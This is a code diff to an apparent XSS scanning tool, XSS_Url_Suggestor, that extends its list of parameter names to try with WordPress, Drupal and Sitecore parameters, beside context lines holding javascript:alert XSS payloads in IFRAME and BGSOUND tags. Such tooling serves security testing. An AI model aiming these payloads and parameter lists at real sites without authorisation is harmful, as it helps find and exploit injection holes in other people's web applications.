@@ -49,7 +49,20 @@ class XSS_Url_Suggestor:
                    '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
                    '<BGSOUND SRC="javascript:alert(\'XSS\');">']
 
-    common_param_names = ['search', 'query', 'id', 'page', 'q']
+    # Common parameter names found across many web applications.  The list has
+    # been extended with parameters typically used by popular CMS platforms
+    # such as WordPress, Drupal and Sitecore to improve XSS payload coverage.
+    common_param_names = [
+        # Generic parameters
+        'search', 'query', 'id', 'page', 'q',
+        # WordPress specific
+        's', 'cat', 'tag', 'author', 'p', 'page_id', 'name',
+        # Drupal specific
+        'nid', 'node', 'type', 'search_api_fulltext',
+        # Sitecore specific
+        'sc_mode', 'sc_lang', 'sc_itemid', 'sc_site', 'sc_template',
+        'sc_version'
+    ]
 
     def __init__(self, url, driver=None):
         self.version = 0.1
